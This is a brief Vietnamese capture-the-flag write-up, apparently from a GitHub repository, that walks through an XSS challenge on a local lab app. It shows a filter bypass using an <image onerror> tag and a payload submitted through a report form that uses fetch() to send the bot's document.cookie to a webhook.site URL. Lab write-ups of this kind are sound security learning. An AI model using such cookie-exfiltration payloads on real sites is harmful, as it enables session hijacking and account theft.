- Phần đầu của thử thách là XSS nên em đã thử truyền vào một lệnh alert thông qua thẻ <script> nhưng</br></br>![image](https://user-images.githubusercontent.com/99264349/213097372-e4471a0a-8454-4545-a377-b001d0787208.png)</br></br>
- Thử tiếp với các thẻ có khả năng thì em tìm được thẻ `<image src =hihi onerror=alert('Hihihi!')>`</br></br>![image](https://user-images.githubusercontent.com/99264349/213102774-48d5bcf3-cb4e-4eb5-acf1-405423f37ec5.png)
</br></br>
- Tiếp theo bấm vào gửi report của bạn tại đây em thấy form report:</br>![image](https://user-images.githubusercontent.com/99264349/213104077-41c2816a-81e1-45d7-8b63-a48e7726ae60.png)
- Em tạo một server trên https://webhook.site và gửi request với thẻ `<image>` vừa tìm được qua fetch API, payload:</br> ``http://127.0.0.1:13337/?message=<image src=hihi onerror=fetch(`http://webhook.site/38bc6754-b246-4dbf-b3ab-5d0bfc9a62dd`)>``</br></br>
- Request thành công: ![image](https://user-images.githubusercontent.com/99264349/213104767-b4ce454c-8ea7-4a1d-b41c-f7c348734db2.png)</br></br>
- Bây giờ thử lấy cookie của bot xem, payload:</br> ``http://127.0.0.1:13337/?message=<image src=hihi onerror=fetch(`http://webhook.site/38bc6754-b246-4dbf-b3ab-5d0bfc9a62dd?a=${document.cookie}`)>``</br></br>
- Vậy là tìm được rùi :>> ![image](https://user-images.githubusercontent.com/99264349/213105763-e87f92f7-2f34-4baf-a7fa-43f86dd5a405.png)
